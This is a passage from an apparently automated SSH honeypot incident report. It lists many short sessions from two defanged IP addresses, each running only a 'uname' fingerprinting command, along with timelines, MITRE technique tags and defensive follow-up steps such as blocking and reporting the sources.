| `2026-07-04 18:57:50` | `cowrie.command.input` |
| `2026-07-04 18:57:50` | `cowrie.log.closed` |
| `2026-07-04 18:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e78b7ec341

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:53` | `cowrie.session.connect` |
| `2026-07-04 18:57:54` | `cowrie.client.version` |
| `2026-07-04 18:57:54` | `cowrie.client.kex` |
| `2026-07-04 18:57:54` | `cowrie.login.success` |
| `2026-07-04 18:57:55` | `cowrie.session.params` |
| `2026-07-04 18:57:55` | `cowrie.command.input` |
| `2026-07-04 18:57:55` | `cowrie.log.closed` |
| `2026-07-04 18:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f1fab6caa1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:57 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:57:59` | `cowrie.session.connect` |
| `2026-07-04 18:57:59` | `cowrie.client.version` |
| `2026-07-04 18:57:59` | `cowrie.client.kex` |
| `2026-07-04 18:57:59` | `cowrie.login.success` |
| `2026-07-04 18:58:00` | `cowrie.session.params` |
| `2026-07-04 18:58:00` | `cowrie.command.input` |
| `2026-07-04 18:58:01` | `cowrie.log.closed` |
| `2026-07-04 18:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88331a2cd93b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:04` | `cowrie.session.connect` |
| `2026-07-04 18:58:04` | `cowrie.client.version` |
| `2026-07-04 18:58:05` | `cowrie.client.kex` |
| `2026-07-04 18:58:05` | `cowrie.login.success` |
| `2026-07-04 18:58:06` | `cowrie.session.params` |
| `2026-07-04 18:58:06` | `cowrie.command.input` |
| `2026-07-04 18:58:06` | `cowrie.log.closed` |
| `2026-07-04 18:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53a4f819add

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:05` | `cowrie.session.connect` |
| `2026-07-04 18:58:05` | `cowrie.client.version` |
| `2026-07-04 18:58:06` | `cowrie.client.kex` |
| `2026-07-04 18:58:07` | `cowrie.login.success` |
| `2026-07-04 18:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c56f30bcc2bc

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:06` | `cowrie.session.connect` |
| `2026-07-04 18:58:06` | `cowrie.client.version` |
| `2026-07-04 18:58:06` | `cowrie.client.kex` |
| `2026-07-04 18:58:07` | `cowrie.login.success` |
| `2026-07-04 18:58:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b142074fc5c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:10` | `cowrie.session.connect` |
| `2026-07-04 18:58:10` | `cowrie.client.version` |
| `2026-07-04 18:58:10` | `cowrie.client.kex` |
| `2026-07-04 18:58:11` | `cowrie.login.success` |
| `2026-07-04 18:58:11` | `cowrie.session.params` |
| `2026-07-04 18:58:11` | `cowrie.command.input` |
| `2026-07-04 18:58:11` | `cowrie.log.closed` |
| `2026-07-04 18:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4fce0d656b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:16` | `cowrie.session.connect` |
| `2026-07-04 18:58:16` | `cowrie.client.version` |
| `2026-07-04 18:58:16` | `cowrie.client.kex` |
| `2026-07-04 18:58:17` | `cowrie.login.success` |
| `2026-07-04 18:58:18` | `cowrie.session.params` |
| `2026-07-04 18:58:18` | `cowrie.command.input` |
| `2026-07-04 18:58:18` | `cowrie.log.closed` |
| `2026-07-04 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af49edf1235

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:16` | `cowrie.session.connect` |
| `2026-07-04 18:58:16` | `cowrie.client.version` |
| `2026-07-04 18:58:16` | `cowrie.client.kex` |
| `2026-07-04 18:58:18` | `cowrie.login.success` |
| `2026-07-04 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b643b7943e7c

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:18` | `cowrie.session.connect` |
| `2026-07-04 18:58:18` | `cowrie.client.version` |
| `2026-07-04 18:58:18` | `cowrie.client.kex` |
| `2026-07-04 18:58:19` | `cowrie.login.success` |
| `2026-07-04 18:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c59506270dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:21` | `cowrie.session.connect` |
| `2026-07-04 18:58:21` | `cowrie.client.version` |
| `2026-07-04 18:58:21` | `cowrie.client.kex` |
| `2026-07-04 18:58:22` | `cowrie.login.success` |
| `2026-07-04 18:58:22` | `cowrie.session.params` |
| `2026-07-04 18:58:22` | `cowrie.command.input` |
| `2026-07-04 18:58:23` | `cowrie.log.closed` |
| `2026-07-04 18:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4889e234adfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:26` | `cowrie.session.connect` |
| `2026-07-04 18:58:26` | `cowrie.client.version` |
| `2026-07-04 18:58:26` | `cowrie.client.kex` |
| `2026-07-04 18:58:27` | `cowrie.login.success` |
| `2026-07-04 18:58:28` | `cowrie.session.params` |
| `2026-07-04 18:58:28` | `cowrie.command.input` |
| `2026-07-04 18:58:28` | `cowrie.log.closed` |
| `2026-07-04 18:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55ec7ca4b24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:32` | `cowrie.session.connect` |
| `2026-07-04 18:58:32` | `cowrie.client.version` |
| `2026-07-04 18:58:32` | `cowrie.client.kex` |
| `2026-07-04 18:58:33` | `cowrie.login.success` |
| `2026-07-04 18:58:34` | `cowrie.session.params` |
| `2026-07-04 18:58:34` | `cowrie.command.input` |
| `2026-07-04 18:58:34` | `cowrie.log.closed` |
| `2026-07-04 18:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1bbdb2ad08

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:37` | `cowrie.session.connect` |
| `2026-07-04 18:58:37` | `cowrie.client.version` |
| `2026-07-04 18:58:38` | `cowrie.client.kex` |
| `2026-07-04 18:58:38` | `cowrie.login.success` |
| `2026-07-04 18:58:39` | `cowrie.session.params` |
| `2026-07-04 18:58:39` | `cowrie.command.input` |
| `2026-07-04 18:58:39` | `cowrie.log.closed` |
| `2026-07-04 18:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab0ad346d12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:43` | `cowrie.session.connect` |
| `2026-07-04 18:58:43` | `cowrie.client.version` |
| `2026-07-04 18:58:43` | `cowrie.client.kex` |
| `2026-07-04 18:58:44` | `cowrie.login.success` |
| `2026-07-04 18:58:45` | `cowrie.session.params` |
| `2026-07-04 18:58:45` | `cowrie.command.input` |
| `2026-07-04 18:58:45` | `cowrie.log.closed` |
| `2026-07-04 18:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8b50858360

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:48` | `cowrie.session.connect` |
| `2026-07-04 18:58:49` | `cowrie.client.version` |
| `2026-07-04 18:58:49` | `cowrie.client.kex` |
| `2026-07-04 18:58:49` | `cowrie.login.success` |
| `2026-07-04 18:58:50` | `cowrie.session.params` |
| `2026-07-04 18:58:50` | `cowrie.command.input` |
| `2026-07-04 18:58:50` | `cowrie.log.closed` |
| `2026-07-04 18:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ca7dff1223

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:54` | `cowrie.session.connect` |
| `2026-07-04 18:58:54` | `cowrie.client.version` |
| `2026-07-04 18:58:54` | `cowrie.client.kex` |
| `2026-07-04 18:58:54` | `cowrie.login.success` |
| `2026-07-04 18:58:55` | `cowrie.session.params` |
| `2026-07-04 18:58:55` | `cowrie.command.input` |
| `2026-07-04 18:58:55` | `cowrie.log.closed` |
| `2026-07-04 18:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b822d915fe9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:58 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:58:59` | `cowrie.session.connect` |
| `2026-07-04 18:58:59` | `cowrie.client.version` |
| `2026-07-04 18:58:59` | `cowrie.client.kex` |
| `2026-07-04 18:59:00` | `cowrie.login.success` |
| `2026-07-04 18:59:00` | `cowrie.session.params` |
| `2026-07-04 18:59:00` | `cowrie.command.input` |
| `2026-07-04 18:59:01` | `cowrie.log.closed` |
| `2026-07-04 18:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44a476d1f26

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:05` | `cowrie.session.connect` |
| `2026-07-04 18:59:05` | `cowrie.client.version` |
| `2026-07-04 18:59:05` | `cowrie.client.kex` |
| `2026-07-04 18:59:05` | `cowrie.login.success` |
| `2026-07-04 18:59:06` | `cowrie.session.params` |
| `2026-07-04 18:59:06` | `cowrie.command.input` |
| `2026-07-04 18:59:07` | `cowrie.log.closed` |
| `2026-07-04 18:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f57f5683a52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:10` | `cowrie.session.connect` |
| `2026-07-04 18:59:10` | `cowrie.client.version` |
| `2026-07-04 18:59:10` | `cowrie.client.kex` |
| `2026-07-04 18:59:11` | `cowrie.login.success` |
| `2026-07-04 18:59:12` | `cowrie.session.params` |
| `2026-07-04 18:59:12` | `cowrie.command.input` |
| `2026-07-04 18:59:12` | `cowrie.log.closed` |
| `2026-07-04 18:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b49421f9951c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:15` | `cowrie.session.connect` |
| `2026-07-04 18:59:15` | `cowrie.client.version` |
| `2026-07-04 18:59:15` | `cowrie.client.kex` |
| `2026-07-04 18:59:16` | `cowrie.login.success` |
| `2026-07-04 18:59:17` | `cowrie.session.params` |
| `2026-07-04 18:59:17` | `cowrie.command.input` |
| `2026-07-04 18:59:17` | `cowrie.log.closed` |
| `2026-07-04 18:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3626809e688e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:21` | `cowrie.session.connect` |
| `2026-07-04 18:59:21` | `cowrie.client.version` |
| `2026-07-04 18:59:21` | `cowrie.client.kex` |
| `2026-07-04 18:59:22` | `cowrie.login.success` |
| `2026-07-04 18:59:23` | `cowrie.session.params` |
| `2026-07-04 18:59:23` | `cowrie.command.input` |
| `2026-07-04 18:59:23` | `cowrie.log.closed` |
| `2026-07-04 18:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1f8e09692b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:27` | `cowrie.session.connect` |
| `2026-07-04 18:59:27` | `cowrie.client.version` |
| `2026-07-04 18:59:27` | `cowrie.client.kex` |
| `2026-07-04 18:59:27` | `cowrie.login.success` |
| `2026-07-04 18:59:28` | `cowrie.session.params` |
| `2026-07-04 18:59:28` | `cowrie.command.input` |
| `2026-07-04 18:59:28` | `cowrie.log.closed` |
| `2026-07-04 18:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cfdbfc1497

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:32` | `cowrie.session.connect` |
| `2026-07-04 18:59:32` | `cowrie.client.version` |
| `2026-07-04 18:59:32` | `cowrie.client.kex` |
| `2026-07-04 18:59:33` | `cowrie.login.success` |
| `2026-07-04 18:59:34` | `cowrie.session.params` |
| `2026-07-04 18:59:34` | `cowrie.command.input` |
| `2026-07-04 18:59:34` | `cowrie.log.closed` |
| `2026-07-04 18:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac5b7bab283

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:38` | `cowrie.session.connect` |
| `2026-07-04 18:59:38` | `cowrie.client.version` |
| `2026-07-04 18:59:38` | `cowrie.client.kex` |
| `2026-07-04 18:59:39` | `cowrie.login.success` |
| `2026-07-04 18:59:39` | `cowrie.session.params` |
| `2026-07-04 18:59:39` | `cowrie.command.input` |
| `2026-07-04 18:59:40` | `cowrie.log.closed` |
| `2026-07-04 18:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0bef6a878b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:43` | `cowrie.session.connect` |
| `2026-07-04 18:59:43` | `cowrie.client.version` |
| `2026-07-04 18:59:43` | `cowrie.client.kex` |
| `2026-07-04 18:59:44` | `cowrie.login.success` |
| `2026-07-04 18:59:45` | `cowrie.session.params` |
| `2026-07-04 18:59:45` | `cowrie.command.input` |
| `2026-07-04 18:59:45` | `cowrie.log.closed` |
| `2026-07-04 18:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1392731e8375

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 18:59:49` | `cowrie.session.connect` |
| `2026-07-04 18:59:49` | `cowrie.client.version` |
| `2026-07-04 18:59:49` | `cowrie.client.kex` |
| `2026-07-04 18:59:49` | `cowrie.login.success` |
| `2026-07-04 18:59:50` | `cowrie.session.params` |
| `2026-07-04 18:59:50` | `cowrie.command.input` |
| `2026-07-04 18:59:50` | `cowrie.log.closed` |
| `2026-07-04 18:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]195` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73759fdba331

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]195` |
| **First Seen** | 2026-07-04 18:59 |
| **Last Seen** | 2026-07-04 18:59 |
| **Session Duration** | 1s |
